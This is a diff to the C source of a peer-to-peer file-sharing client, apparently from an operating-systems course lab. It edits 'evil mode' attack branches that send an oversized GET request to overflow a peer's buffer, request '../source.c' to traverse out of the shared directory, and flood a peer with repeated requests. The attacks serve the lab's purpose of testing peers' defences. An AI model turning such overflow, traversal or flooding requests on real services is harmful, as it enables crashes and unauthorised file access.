@@ -139,7 +139,9 @@ static void task_free(task_t *t)
 		do {
 			task_pop_peer(t);
 		} while (t->peer_list);
+		printf("Trying to free a peer!");
 		free(t);
+		printf("Done freeing a peer!");
 	}
 }
 
@@ -539,23 +541,25 @@ static void task_download(task_t *t, task_t *tracker_task)
 	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
 		   && t->peer_list->port == listen_port)
 		goto try_again;
-
+	
 	//ATTACK 1: BUFFER OVERFLOW
 	if( evil_mode == 1){
-          t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+        
+	  t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
           if (t->peer_fd == -1) {
             error("* Cannot connect to peer: %s\n", strerror(errno));
             goto try_again;
-	  }
+	    }
 
-          message("* Buffer overflow to crash downloader");
+          message("* Buffer overflow to crash downloader\n");
 
-          char evilBuffer[FILENAMESIZ*10];
-
-          memset(evilBuffer, 'A', FILENAMESIZ*10);
-
+          char evilBuffer[FILENAMESIZ*5];
+	  
+          memset(evilBuffer, 'A', FILENAMESIZ*5);
+	  
           osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evilBuffer);
         }
+
 
 	//ATTACK 2: PULL BAD FILE REQUEST
 	if(evil_mode == 2){
@@ -564,7 +568,7 @@ static void task_download(task_t *t, task_t *tracker_task)
             error("* Cannot connect to peer: %s\n", strerror(errno));
             goto try_again;
 	  }
-	  message("* Pulling bad file");
+	  message("* Pulling bad file\n");
 
           char bad_file[FILENAMESIZ] = "../source.c";
 
@@ -578,8 +582,8 @@ static void task_download(task_t *t, task_t *tracker_task)
 	    error("* Cannot connect to peer: %s\n", strerror(errno));
 	    goto try_again;
 	  }
-
-	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	  message("* Repeatedly requesting file\n");
+	  osp2p_writef(t->peer_fd, "GET message %s OSP2P\n", t->filename);
         }
 
 	// Connect to the peer and write the GET command
@@ -591,6 +595,10 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
+
+
+
+
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
@@ -897,7 +905,7 @@ int main(int argc, char *argv[])
 	    }
 	    else if (p < 0)
 	      error("Failed to fork.");
-	    task_free(t); 
+	    //task_free(t); 
 	  }
 	}
 	// Then accept connections from other peers and upload files to them!
@@ -909,7 +917,7 @@ int main(int argc, char *argv[])
 	  }
 	  else if (p < 0)
 	    error("Failed to fork.");
-	  task_free(t);
+	  // task_free(t);
 	}
 	return 0;
 }
